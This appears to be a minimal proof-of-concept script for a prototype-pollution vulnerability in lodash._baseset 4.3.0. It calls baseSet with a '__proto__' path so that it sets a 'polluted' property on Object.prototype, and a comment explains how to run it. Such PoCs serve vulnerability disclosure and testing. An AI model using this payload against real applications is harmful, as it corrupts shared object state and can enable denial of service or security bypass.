// comment out the line `var stringToPath = require('lodash._stringtopath');` in index.js to run the PoC
// because we have not installed this package

var baseSet = require('./lodash._baseset@4.3.0');
baseSet({}, ['__proto__', 'polluted'], 'yes')